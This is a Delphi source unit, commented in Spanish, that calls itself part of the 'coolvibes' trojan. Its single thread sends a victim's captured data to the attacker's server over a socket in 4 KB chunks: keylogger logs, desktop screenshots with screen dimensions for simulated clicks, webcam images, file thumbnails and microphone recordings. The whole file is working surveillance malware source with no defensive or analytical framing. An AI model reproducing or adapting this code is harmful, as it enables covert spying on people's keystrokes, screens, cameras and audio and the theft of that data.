{Unit perteniciente al troyano coolvibes que se encarga de gestionar el envio de keylogger, thumbnails,captura de pantalla y de webcam}
unit UnitThreadsCapCamCapture;

interface

uses Windows, SysUtils, SocketUnit, UnitVariables, classes, unitCapScreen, unitfunciones, UnitAudio;

type
  TThreadCapCam = class(TThread)
  public
    Server: TClientSocket;
    Host: string;
    port: string;
    SH: string;
    constructor Create(SHi: Integer; Servidor: TClientSocket);
  protected
    procedure Execute; override;
  end;
implementation

constructor TThreadCapCam.Create(SHi: Integer; Servidor: TClientSocket);
begin
  inherited Create(True);
  SH := IntToStr(SHi);
  Server := Servidor;
end;

procedure TThreadCapCam.Execute();
var
  Tempstr1, Tempstr2, tempstr, tempstr3, tempstr4, recibido, buffer: string;
  MS: TMemoryStream;
  Enviando: array[0..5] of Boolean;
  EnviandoStr: array[0..5] of string;
  AudioInfo: TAudioInfo; //Thread para captura de audio
  Grabando: Boolean;
const
  BlockSize = 1024 * 4; //4kb
begin

  FreeOnTerminate := True;
  Enviando[0] := False;
  Enviando[1] := False;
  Enviando[2] := False;
  Enviando[3] := False;
  Enviando[4] := False;
  Grabando := False;
  EnviandoStr[0] := '';
  EnviandoStr[1] := '';
  EnviandoStr[2] := '';
  EnviandoStr[3] := '';
  EnviandoStr[4] := '';

  while (server.Connected) do
    begin
      if pararcapturathread then break;
      if not (Enviando[0] or Enviando[1] or Enviando[2] or Enviando[3] or Enviando[4]) then
        sleep(1); //Para no saturar la cpu

      if ((CapturaKeylogger <> '') or Enviando[4]) then
        begin
          if not Enviando[4] then
            begin
              Enviando[4] := True;
              EnviandoStr[4] := CapturaKeylogger;
              server.SendString('SH|' + SH + #10 + 'KEYLOGGERLOGSTART|' + IntToStr(Length(EnviandoStr[4])) + '|' + #10); //Enviamos el tamaño
            end;

          TempStr := Copy(EnviandoStr[4], 1, BlockSize); //Bloques de BlockSize
          Delete(EnviandoStr[4], 1, BlockSize);

          if TempStr <> '' then
            begin
              server.SendString('SH|' + SH + #10 + 'KEYLOGGERLOGCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
            end
          else
            begin
              Enviando[4] := False; //Ya hemos terminado
              CapturaKeylogger := '';
            end;
        end;

      if ((CapturaPantalla <> '') or Enviando[0]) then
        begin
          if not Enviando[0] then
            begin
              Recibido := CapturaPantalla;
              TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //calidad
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //alto
              Delete(Recibido, 1, Pos('|', Recibido));

              MS := TMemoryStream.Create; //MS de la captura de Pantalla
              MS.Position := 0;
              pantallazo(StrToInt(TempStr1), (StrToInt(TempStr2) * anchurapantalla) div alturapantalla, StrToInt(Tempstr2), GetDesktopWindow(), MS);
              MS.Position := 0;

              SetLength(EnviandoStr[0], ms.Size);
              Ms.read(EnviandoStr[0][1], ms.Size);
              MS.Free;
              MS := nil;
              //De paso se manda también la anchura y la altura para poder simular clicks
              server.SendString('SH|' + SH + #10 + 'CAPSCREENSTART|' + IntToStr(AnchuraPantalla) + '¬' + IntToStr(AlturaPantalla) + '|' + IntToStr(Length(EnviandoStr[0])) + #10); //mandamos el tamaño

              Enviando[0] := True;
            end;

          TempStr := Copy(EnviandoStr[0], 1, BlockSize); //Bloques de BlockSize
          Delete(EnviandoStr[0], 1, BlockSize);

          if TempStr <> '' then
            begin
              server.SendString('SH|' + SH + #10 + 'CAPSCREENCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
            end
          else
            begin
              Enviando[0] := False; //Ya hemos terminado
              Capturapantalla := '';
            end;
        end;

      if ((CapturaWebcam <> '') or Enviando[1]) then
        begin
          if not Enviando[1] then
            begin
              server.SendString('SH|' + SH + #10 + 'CAPTURAWEBCAMSTART|' + IntToStr(Length(CapturaWebcam)) + #10); //mandamos el tamaño
              Enviando[1] := True;
              EnviandoStr[1] := CapturaWebcam;
            end;

          TempStr := Copy(EnviandoStr[1], 1, BlockSize); //Bloques de BlockSize
          Delete(EnviandoStr[1], 1, BlockSize);
          server.SendString('SH|' + SH + #10 + 'WEBCAMCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO

          if EnviandoStr[1] = '' then
            begin
              Enviando[1] := False;
              CapturaWebcam := '';
            end;
        end;

      if ((CapturaThumb <> '') or Enviando[2]) then
        begin
          if not Enviando[2] then
            begin
              Enviando[2] := True;
              Recibido := Trim(CapturaThumb); //filename|width|height|calidad|

              TempStr := Copy(recibido, 1, Pos('|', recibido) - 1); //Filename
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(recibido, 1, Pos('|', Recibido) - 1); //width
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr2 := Copy(recibido, 1, Pos('|', Recibido) - 1); //height
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr3 := Copy(recibido, 1, Pos('|', Recibido) - 1); //calidad
              Delete(Recibido, 1, Pos('|', Recibido));

              MS := TMemoryStream.Create; //MS de la captura de Pantalla
              MS.Position := 0;
              if Generatethumb(Tempstr, StrToInt(Tempstr1), StrToInt(Tempstr2), StrToInt(Tempstr3), MS) then
                begin
                  MS.Position := 0;
                  if server.Connected then
                    begin
                      server.SendString('SH|' + SH + #10 + 'THUMBNAILSTART|' + IntToStr(MS.Size) + #10); //mandamos el tamaño
                    end;
                  EnviandoStr[2] := '';
                  SetLength(EnviandoStr[2], ms.Size);
                  MS.read(EnviandoStr[2][1], ms.Size);
                  MS.Free;
                  MS := nil;
                end
              else
                begin //error al capturar thumb
                  Enviando[2] := False; //Ya hemos terminado
                  CapturaThumb := '';
                  if server.Connected then
                    server.SendString('SH|' + SH + #10 + 'THUMBNAILERROR' + #10);
                end;
            end
          else
            begin

              TempStr := Copy(EnviandoStr[2], 1, BlockSize); //Bloques de BlockSize
              Delete(EnviandoStr[2], 1, BlockSize);

              if TempStr <> '' then
                begin
                  server.SendString('SH|' + SH + #10 + 'THUMBNAILCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
                end
              else
                begin
                  Enviando[2] := False; //Ya hemos terminado
                  CapturaThumb := '';
                end;
            end;
        end;

      if RecordedAudio <> '' then
        begin
          Grabando := False;
          Enviando[3] := True;
          EnviandoStr[3] := RecordedAudio;
          RecordedAudio := '';
          server.SendString('SH|' + SH + #10 + 'AUDIOSTART|' + IntToStr(Length(EnviandoStr[3])) + '|' + #10);
        end;

      if ((CapturaAudio <> '') or Enviando[3]) and (not grabando) then
        begin
          if not Enviando[3] then
            begin
              Recibido := Trim(CapturaAudio); //segundos|hz-canales-bits|dispositivo|

              TempStr := Copy(recibido, 1, Pos('|', recibido) - 1); //segundos
              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr1 := Copy(recibido, 1, Pos('|', Recibido) - 1); //calidad

              TempStr3 := Copy(TempStr1, 1, Pos('-', TempStr1) - 1); //HZ
              Delete(TempStr1, 1, Pos('-', TempStr1));
              TempStr4 := Copy(TempStr1, 1, Pos('-', TempStr1) - 1); //Canales 1|2
              Delete(TempStr1, 1, Pos('-', TempStr1)); //Tempstr1 = bits: 8|16;

              Delete(Recibido, 1, Pos('|', Recibido));
              TempStr2 := Copy(recibido, 1, Pos('|', Recibido) - 1); //dispositivo
              Delete(Recibido, 1, Pos('|', Recibido));
              buffer := '';

              AudioInfo := TAudioInfo.Create(StrToIntDef(tempstr2, 0) {Dispositivo},
                StrToIntDef(tempstr, 1) {Duracion en segundos},
                StrToIntDef(tempstr3, 11025),
                StrToIntDef(tempstr1, 8) {bits},
                StrToIntDef(tempstr4, 1) {mono|stereo});
              //ThreadedTransfer(Pointer(ThreadInfo)); //Para debug

              BeginThread(nil,
                0,
                Addr(StartRecording),
                AudioInfo,
                0,
                AudioInfo.ThreadId);
              Grabando := True;
            end;
          if not grabando then
            begin
              TempStr := Copy(EnviandoStr[3], 1, BlockSize); //Bloques de BlockSize
              Delete(EnviandoStr[3], 1, BlockSize);

              if TempStr <> '' then
                begin
                  server.SendString('SH|' + SH + #10 + 'AUDIOCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
                end
              else
                begin
                  Enviando[3] := False; //Ya hemos terminado
                  CapturaAudio := '';
                end;
            end;
        end;
    end;
  Pararcapturathread := True;
  ExitThread(0);
end;

end.
